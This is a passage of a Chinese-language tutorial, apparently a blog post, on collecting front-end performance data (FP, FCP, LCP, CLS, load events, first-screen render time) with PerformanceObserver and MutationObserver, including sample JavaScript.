        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>一个完整的前端监控平台包括三个部分：数据采集与上报、数据整理和存储、数据展示。<br />本文要讲的就是其中的第一个环节——数据采集与上报。下图是本文要讲述内容的大纲，大家可以先大致了解一下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142088-268849ae-1045-471d-8715-dff44a969954.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142088-268849ae-1045-471d-8715-dff44a969954.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif">，可以用它来写一些简单的 DEMO，帮助加深理解。再结合本文一起阅读，效果更好。<br><a name="o11zp"></a></p><h2 id="性能数据采集"><a href="#性能数据采集" class="headerlink" title="性能数据采集"></a>性能数据采集</h2><p>chrome 开发团队提出了一系列用于检测网页性能的指标：</p><ul><li>FP(first-paint)，从页面加载开始到第一个像素绘制到屏幕上的时间</li><li>FCP(first-contentful-paint)，从页面加载开始到页面内容的任何部分在屏幕上完成渲染的时间</li><li>LCP(largest-contentful-paint)，从页面加载开始到最大文本块或图像元素在屏幕上完成渲染的时间</li><li>CLS(layout-shift)，从页面加载开始和其<a href="https://link.juejin.cn/?target=https://developers.google.com/web/updates/2018/07/page-lifecycle-api">生命周期状态</a>变为隐藏期间发生的所有意外布局偏移的累积分数</li></ul><p>这四个性能指标都需要通过 <a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceObserver">PerformanceObserver</a> 来获取（也可以通过 performance.getEntriesByName() 获取，但它不是在事件触发时通知的）。PerformanceObserver 是一个性能监测对象，用于监测性能度量事件。<br><a name="pQODz"></a></p><h3 id="FP"><a href="#FP" class="headerlink" title="FP"></a>FP</h3><p>FP(first-paint)，从页面加载开始到第一个像素绘制到屏幕上的时间。其实把 FP 理解成白屏时间也是没问题的。<br />测量代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">entryHandler</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.<span class="title function_">getEntries</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (entry.<span class="property">name</span> === <span class="string">&quot;first-paint&quot;</span>) &#123;</span><br><span class="line">      observer.<span class="title function_">disconnect</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(entry);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">PerformanceObserver</span>(entryHandler);</span><br><span class="line"><span class="comment">// buffered 属性表示是否观察缓存数据，也就是说观察代码添加时机比事情触发时机晚也没关系。</span></span><br><span class="line">observer.<span class="title function_">observe</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;paint&quot;</span>, <span class="attr">buffered</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p>通过以上代码可以得到 FP 的内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">entryType</span>: <span class="string">&quot;paint&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;first-paint&quot;</span>,</span><br><span class="line">    <span class="attr">startTime</span>: <span class="number">359</span>, <span class="comment">// fp 时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 startTime 就是我们要的绘制时间。<br><a name="EoHX8"></a></p><h3 id="FCP"><a href="#FCP" class="headerlink" title="FCP"></a>FCP</h3><p>FCP(first-contentful-paint)，从页面加载开始到页面内容的任何部分在屏幕上完成渲染的时间。对于该指标，”内容”指的是文本、图像（包括背景图像）、<svg>元素或非白色的<canvas>元素。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142180-f2cde2e9-9ca2-4d80-8713-10b88bc3285e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142180-f2cde2e9-9ca2-4d80-8713-10b88bc3285e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />测量代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">entryHandler</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.<span class="title function_">getEntries</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (entry.<span class="property">name</span> === <span class="string">&quot;first-contentful-paint&quot;</span>) &#123;</span><br><span class="line">      observer.<span class="title function_">disconnect</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(entry);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">PerformanceObserver</span>(entryHandler);</span><br><span class="line">observer.<span class="title function_">observe</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;paint&quot;</span>, <span class="attr">buffered</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p>通过以上代码可以得到 FCP 的内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">entryType</span>: <span class="string">&quot;paint&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;first-contentful-paint&quot;</span>,</span><br><span class="line">    <span class="attr">startTime</span>: <span class="number">459</span>, <span class="comment">// fcp 时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 startTime 就是我们要的绘制时间。<br><a name="WzCiM"></a></p><h3 id="LCP"><a href="#LCP" class="headerlink" title="LCP"></a>LCP</h3><p>LCP(largest-contentful-paint)，从页面加载开始到最大文本块或图像元素在屏幕上完成渲染的时间。LCP 指标会根据页面<a href="https://link.juejin.cn/?target=https://w3c.github.io/hr-time/%23timeorigin-attribute">首次开始加载</a>的时间点来报告可视区域内可见的最大<a href="https://link.juejin.cn/?target=https://web.dev/lcp/%23what-elements-are-considered">图像或文本块</a>完成渲染的相对时间。<br />一个良好的 LCP 分数应该控制在 2.5 秒以内。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142085-b3464e1c-3470-4c48-a587-2fd3b2cb32ad.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142085-b3464e1c-3470-4c48-a587-2fd3b2cb32ad.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />测量代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">entryHandler</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (observer) &#123;</span><br><span class="line">    observer.<span class="title function_">disconnect</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.<span class="title function_">getEntries</span>()) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(entry);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">PerformanceObserver</span>(entryHandler);</span><br><span class="line">observer.<span class="title function_">observe</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;largest-contentful-paint&quot;</span>, <span class="attr">buffered</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p>通过以上代码可以得到 LCP 的内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">element</span>: p,</span><br><span class="line">    <span class="attr">entryType</span>: <span class="string">&quot;largest-contentful-paint&quot;</span>,</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">loadTime</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">renderTime</span>: <span class="number">1021.299</span>,</span><br><span class="line">    <span class="attr">size</span>: <span class="number">37932</span>,</span><br><span class="line">    <span class="attr">startTime</span>: <span class="number">1021.299</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 startTime 就是我们要的绘制时间。element 是指 LCP 绘制的 DOM 元素。<br />FCP 和 LCP 的区别是：FCP 只要任意内容绘制完成就触发，LCP 是最大内容渲染完成时触发。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142459-f307ad02-d85c-4b68-8501-616e8cffdbd6.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142459-f307ad02-d85c-4b68-8501-616e8cffdbd6.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />LCP 考察的元素类型为：</p><ul><li><img>元素</li><li>内嵌在<svg>元素内的<image>元素</li><li><video>元素（使用封面图像）</li><li>通过<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/docs/Web/CSS/url()">url()</a>函数（而非使用<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/docs/Web/CSS/CSS_Images/Using_CSS_gradients">CSS 渐变</a>）加载的带有背景图像的元素</li><li>包含文本节点或其他行内级文本元素子元素的<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/docs/Web/HTML/Block-level_elements">块级元素</a>。<br><a name="Ry3ft"></a></li></ul><h3 id="CLS"><a href="#CLS" class="headerlink" title="CLS"></a>CLS</h3><p>CLS(layout-shift)，从页面加载开始和其<a href="https://link.juejin.cn/?target=https://developers.google.com/web/updates/2018/07/page-lifecycle-api">生命周期状态</a>变为隐藏期间发生的所有意外布局偏移的累积分数。<br />布局偏移分数的计算方式如下：<br />布局偏移分数 &#x3D; 影响分数 * 距离分数 复制代码<br /><a href="https://link.juejin.cn/?target=https://github.com/WICG/layout-instability%23Impact-Fraction">影响分数</a>测量<em>不稳定元素</em>对两帧之间的可视区域产生的影响。<br /><em>距离分数</em>指的是任何<em>不稳定元素</em>在一帧中位移的最大距离（水平或垂直）除以可视区域的最大尺寸维度（宽度或高度，以较大者为准）。<br /><strong>CLS 就是把所有布局偏移分数加起来的总和</strong>。<br />当一个 DOM 在两个渲染帧之间产生了位移，就会触发 CLS（如图所示）。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142442-f33631d8-9cb2-4659-a0d0-70657c9ed6cb.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142442-f33631d8-9cb2-4659-a0d0-70657c9ed6cb.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif">。<br />CLS 一共有三种计算方式：</p><ol><li>累加</li><li>取所有会话窗口的平均数</li><li>取所有会话窗口中的最大值<br><a name="bDCYd"></a></li></ol><h4 id="累加"><a href="#累加" class="headerlink" title="累加"></a>累加</h4><p>也就是把从页面加载开始的所有布局偏移分数加在一起。但是这种计算方式对生命周期长的页面不友好，页面存留时间越长，CLS 分数越高。<br><a name="Drzqw"></a></p><h4 id="取所有会话窗口的平均数"><a href="#取所有会话窗口的平均数" class="headerlink" title="取所有会话窗口的平均数"></a>取所有会话窗口的平均数</h4><p>这种计算方式不是按单个布局偏移为单位，而是以会话窗口为单位。将所有会话窗口的值相加再取平均值。但是这种计算方式也有缺点。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142820-23905bf9-6492-4566-83a5-0e49c0bfd429.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142820-23905bf9-6492-4566-83a5-0e49c0bfd429.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />从上图可以看出来，第一个会话窗口产生了比较大的 CLS 分数，第二个会话窗口产生了比较小的 CLS 分数。如果取它们的平均值来当做 CLS 分数，则根本看不出来页面的运行状况。原来页面是早期偏移多，后期偏移少，现在的平均值无法反映出这种情况。<br><a name="VYSn4"></a></p><h4 id="取所有会话窗口中的最大值"><a href="#取所有会话窗口中的最大值" class="headerlink" title="取所有会话窗口中的最大值"></a>取所有会话窗口中的最大值</h4><p>这种方式是目前最优的计算方式，每次只取所有会话窗口的最大值，用来反映页面布局偏移的最差情况。详情请看 <a href="https://link.juejin.cn/?target=https://web.dev/evolving-cls/">Evolving the CLS metric</a>。<br />下面是第三种计算方式的测量代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sessionValue = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> sessionEntries = [];</span><br><span class="line"><span class="keyword">const</span> cls = &#123;</span><br><span class="line">  <span class="attr">subType</span>: <span class="string">&quot;layout-shift&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;layout-shift&quot;</span>,</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">  <span class="attr">pageURL</span>: <span class="title function_">getPageURL</span>(),</span><br><span class="line">  <span class="attr">value</span>: <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">entryHandler</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.<span class="title function_">getEntries</span>()) &#123;</span><br><span class="line">    <span class="comment">// Only count layout shifts without recent user input.</span></span><br><span class="line">    <span class="keyword">if</span> (!entry.<span class="property">hadRecentInput</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> firstSessionEntry = sessionEntries[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">const</span> lastSessionEntry = sessionEntries[sessionEntries.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If the entry occurred less than 1 second after the previous entry and</span></span><br><span class="line">      <span class="comment">// less than 5 seconds after the first entry in the session, include the</span></span><br><span class="line">      <span class="comment">// entry in the current session. Otherwise, start a new session.</span></span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        sessionValue &amp;&amp;</span><br><span class="line">        entry.<span class="property">startTime</span> - lastSessionEntry.<span class="property">startTime</span> &lt; <span class="number">1000</span> &amp;&amp;</span><br><span class="line">        entry.<span class="property">startTime</span> - firstSessionEntry.<span class="property">startTime</span> &lt; <span class="number">5000</span></span><br><span class="line">      ) &#123;</span><br><span class="line">        sessionValue += entry.<span class="property">value</span>;</span><br><span class="line">        sessionEntries.<span class="title function_">push</span>(<span class="title function_">formatCLSEntry</span>(entry));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sessionValue = entry.<span class="property">value</span>;</span><br><span class="line">        sessionEntries = [<span class="title function_">formatCLSEntry</span>(entry)];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If the current session value is larger than the current CLS value,</span></span><br><span class="line">      <span class="comment">// update CLS and the entries contributing to it.</span></span><br><span class="line">      <span class="keyword">if</span> (sessionValue &gt; cls.<span class="property">value</span>) &#123;</span><br><span class="line">        cls.<span class="property">value</span> = sessionValue;</span><br><span class="line">        cls.<span class="property">entries</span> = sessionEntries;</span><br><span class="line">        cls.<span class="property">startTime</span> = performance.<span class="title function_">now</span>();</span><br><span class="line">        <span class="title function_">lazyReportCache</span>(<span class="title function_">deepCopy</span>(cls));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">PerformanceObserver</span>(entryHandler);</span><br><span class="line">observer.<span class="title function_">observe</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;layout-shift&quot;</span>, <span class="attr">buffered</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p>在看完上面的文字描述后，再看代码就好理解了。一次布局偏移的测量内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">entryType</span>: <span class="string">&quot;layout-shift&quot;</span>,</span><br><span class="line">  <span class="attr">hadRecentInput</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">lastInputTime</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">sources</span>: (<span class="number">2</span>) [<span class="title class_">LayoutShiftAttribution</span>, <span class="title class_">LayoutShiftAttribution</span>],</span><br><span class="line">  <span class="attr">startTime</span>: <span class="number">1176.199999999255</span>,</span><br><span class="line">  <span class="attr">value</span>: <span class="number">0.000005752046026677329</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中的 value 字段就是布局偏移分数。<br><a name="EYXuD"></a></p><h3 id="DOMContentLoaded、load-事件"><a href="#DOMContentLoaded、load-事件" class="headerlink" title="DOMContentLoaded、load 事件"></a>DOMContentLoaded、load 事件</h3><p>当纯 HTML 被完全加载以及解析时，DOMContentLoaded 事件会被触发，不用等待 css、img、iframe 加载完。<br />当整个页面及所有依赖资源如样式表和图片都已完成加载时，将触发 load 事件。<br />虽然这两个性能指标比较旧了，但是它们仍然能反映页面的一些情况。对于它们进行监听仍然是必要的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; lazyReportCache &#125; <span class="keyword">from</span> <span class="string">&quot;../utils/report&quot;</span>;</span><br><span class="line"></span><br><span class="line">[<span class="string">&quot;load&quot;</span>, <span class="string">&quot;DOMContentLoaded&quot;</span>].<span class="title function_">forEach</span>(<span class="function">(<span class="params">type</span>) =&gt;</span> <span class="title function_">onEvent</span>(type));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onEvent</span>(<span class="params">type</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">lazyReportCache</span>(&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">      <span class="attr">subType</span>: type.<span class="title function_">toLocaleLowerCase</span>(),</span><br><span class="line">      <span class="attr">startTime</span>: performance.<span class="title function_">now</span>(),</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(type, callback, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(type, callback, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="VvDWN"></a></p><h3 id="首屏渲染时间"><a href="#首屏渲染时间" class="headerlink" title="首屏渲染时间"></a>首屏渲染时间</h3><p>大多数情况下，首屏渲染时间可以通过 load 事件获取。除了一些特殊情况，例如异步加载的图片和 DOM。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span>&#123;<span class="string">&quot; &quot;</span>&#125;</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;!-- 省略一堆代码... --&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  , <span class="number">3000</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>像这种情况就无法通过 load 事件获取首屏渲染时间了。这时我们需要通过 <a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/MutationObserver/MutationObserver">MutationObserver</a> 来获取首屏渲染时间。MutationObserver 在监听的 DOM 元素属性发生变化时会触发事件。<br />首屏渲染时间计算过程：</p><ol><li>利用 MutationObserver 监听 document 对象，每当 DOM 元素属性发生变更时，触发事件。</li><li>判断该 DOM 元素是否在首屏内，如果在，则在 requestAnimationFrame() 回调函数中调用 performance.now() 获取当前时间，作为它的绘制时间。</li><li>将最后一个 DOM 元素的绘制时间和首屏中所有加载的图片时间作对比，将最大值作为首屏渲染时间。<br><a name="T368a"></a></li></ol><h4 id="监听-DOM"><a href="#监听-DOM" class="headerlink" title="监听 DOM"></a>监听 DOM</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> next = <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span> ? requestAnimationFrame : <span class="built_in">setTimeout</span>;</span><br><span class="line"><span class="keyword">const</span> ignoreDOMList = [<span class="string">&quot;STYLE&quot;</span>, <span class="string">&quot;SCRIPT&quot;</span>, <span class="string">&quot;LINK&quot;</span>];</span><br><span class="line"></span><br><span class="line">observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(<span class="function">(<span class="params">mutationList</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> entry = &#123;</span><br><span class="line">    <span class="attr">children</span>: [],</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> mutation <span class="keyword">of</span> mutationList) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mutation.<span class="property">addedNodes</span>.<span class="property">length</span> &amp;&amp; <span class="title function_">isInScreen</span>(mutation.<span class="property">target</span>)) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (entry.<span class="property">children</span>.<span class="property">length</span>) &#123;</span><br><span class="line">    entries.<span class="title function_">push</span>(entry);</span><br><span class="line">    <span class="title function_">next</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      entry.<span class="property">startTime</span> = performance.<span class="title function_">now</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">observer.<span class="title function_">observe</span>(<span class="variable language_">document</span>, &#123;</span><br><span class="line">  <span class="attr">childList</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">subtree</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码就是监听 DOM 变化的代码，同时需要过滤掉 style、script、link 等标签。<br><a name="qltvI"></a></p><h4 id="判断是否在首屏"><a href="#判断是否在首屏" class="headerlink" title="判断是否在首屏"></a>判断是否在首屏</h4><p>一个页面的内容可能非常多，但用户最多只能看见一屏幕的内容。所以在统计首屏渲染时间的时候，需要限定范围，把渲染内容限定在当前屏幕内。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> viewportWidth = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line"><span class="keyword">const</span> viewportHeight = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dom 对象是否在屏幕内</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isInScreen</span>(<span class="params">dom</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> rectInfo = dom.<span class="title function_">getBoundingClientRect</span>();</span><br><span class="line">  <span class="keyword">if</span> (rectInfo.<span class="property">left</span> &lt; viewportWidth &amp;&amp; rectInfo.<span class="property">top</span> &lt; viewportHeight) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="BhkqV"></a></p><h4 id="使用-requestAnimationFrame-获取-DOM-绘制时间"><a href="#使用-requestAnimationFrame-获取-DOM-绘制时间" class="headerlink" title="使用 requestAnimationFrame() 获取 DOM 绘制时间"></a>使用 requestAnimationFrame() 获取 DOM 绘制时间</h4><p>当 DOM 变更触发 MutationObserver 事件时，只是代表 DOM 内容可以被读取到，并不代表该 DOM 被绘制到了屏幕上。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142882-a5994025-f4e1-4ff1-99d7-480026f8fd54.png" class="lazyload placeholder" 